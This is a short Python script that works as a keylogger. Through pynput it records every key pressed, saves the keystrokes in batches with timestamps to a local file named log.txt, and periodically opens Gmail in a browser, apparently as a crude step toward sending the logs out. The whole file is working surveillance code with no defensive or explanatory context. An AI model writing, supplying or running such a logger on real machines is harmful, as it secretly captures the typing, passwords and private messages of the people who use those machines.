from pynput import keyboard as kb
import time, os
# Variables
recoleccion = []
global registros
registros = 0


def charge_log(log,logs):
	date_log = str(time.strftime("%d/%m/%y"))+" - "+str(time.strftime("%H:%M:%S"))
	nombre_archivo = "log.txt"
	with open(nombre_archivo, "a") as archivo:
		archivo.write(date_log+"\n")
		archivo.write(str(log)+"\n\n")
	archivo.close()
	global registros
	registros = logs+1
	if registros >= 10:
		os.system('xdg-open "https://mail.google.com/"')
		registros = 0

def pulsa(tecla):
	if len(recoleccion) >= 1000:
		charge_log(recoleccion,registros)
		recoleccion.clear()
	else:
		recoleccion.append(tecla)
		print(recoleccion)
			
with kb.Listener(pulsa) as escuchador:
	escuchador.join()
